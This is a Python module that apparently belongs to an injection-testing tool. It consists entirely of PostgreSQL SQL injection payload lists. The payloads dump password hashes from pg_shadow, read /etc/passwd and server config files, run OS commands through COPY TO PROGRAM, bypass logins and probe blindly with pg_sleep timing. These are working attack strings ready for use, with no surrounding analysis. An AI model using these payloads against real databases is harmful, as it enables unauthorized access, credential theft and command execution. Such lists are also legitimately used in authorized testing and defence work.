"""postgresql.py — PostgreSQL-Specific Injection Payloads"""

PGSQL_PAYLOADS: list[str] = [
    # Version/info
    "' UNION SELECT version(),NULL--",
    "' UNION SELECT current_user,current_database(),version()--",
    "' UNION SELECT usename,passwd,NULL FROM pg_shadow LIMIT 5--",
    "' UNION SELECT table_name,NULL FROM information_schema.tables LIMIT 10--",
    "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users' LIMIT 10--",
    # Copy command (file read/write)
    "'; COPY users TO '/tmp/users.csv'--",
    "'; COPY (SELECT '') TO PROGRAM 'id'--",
    "'; CREATE TABLE tmp(t TEXT); COPY tmp FROM '/etc/passwd'; SELECT * FROM tmp--",
    # Large objects
    "'; SELECT lo_import('/etc/passwd')--",
    "'; SELECT lo_get(16401)--",
    # pg_read_file
    "' UNION SELECT pg_read_file('/etc/passwd',0,10000)--",
    "' UNION SELECT pg_read_file('/var/lib/postgresql/data/postgresql.conf',0,10000)--",
    # Authentication bypass
    "' OR '1'='1'--",
    "' OR 1=1--",
    "admin'--",
    # Concatenation
    "' UNION SELECT 'a'||'dmin',NULL--",
    "' UNION SELECT CHR(65)||CHR(100)||CHR(109)||CHR(105)||CHR(110),NULL--",
    # Type casting
    "' AND 1=CAST(version() AS INT)--",
    "' AND 1::TEXT='1'--",
    # Error-based
    "' AND 1=CAST((SELECT usename FROM pg_shadow LIMIT 1) AS INT)--",
    "' AND CAST((SELECT passwd FROM pg_shadow LIMIT 1) AS INT)=1--",
    # Stacked queries
    "'; SELECT version()--",
    "'; CREATE OR REPLACE FUNCTION shell(text) RETURNS text AS $$ SELECT $1 $$ LANGUAGE sql--",
    "'; SELECT * FROM pg_extension--",
]

PGSQL_BLIND_TIME: list[str] = [
    "'; SELECT pg_sleep(5)--",
    "1; SELECT pg_sleep(5)--",
    "' OR (SELECT 1 FROM pg_sleep(5))='1",
    "' AND (SELECT 1 FROM pg_sleep(5))='1'--",
    "'; SELECT CASE WHEN 1=1 THEN pg_sleep(5) ELSE pg_sleep(0) END--",
    "'; SELECT CASE WHEN 1=2 THEN pg_sleep(5) ELSE pg_sleep(0) END--",
    "'; SELECT CASE WHEN (current_user='postgres') THEN pg_sleep(5) ELSE pg_sleep(0) END--",
    "'; IF 1=1 SELECT pg_sleep(5)--",
    # Baseline (fast)
    "'; SELECT pg_sleep(0)--",
    "1; SELECT pg_sleep(0)--",
]
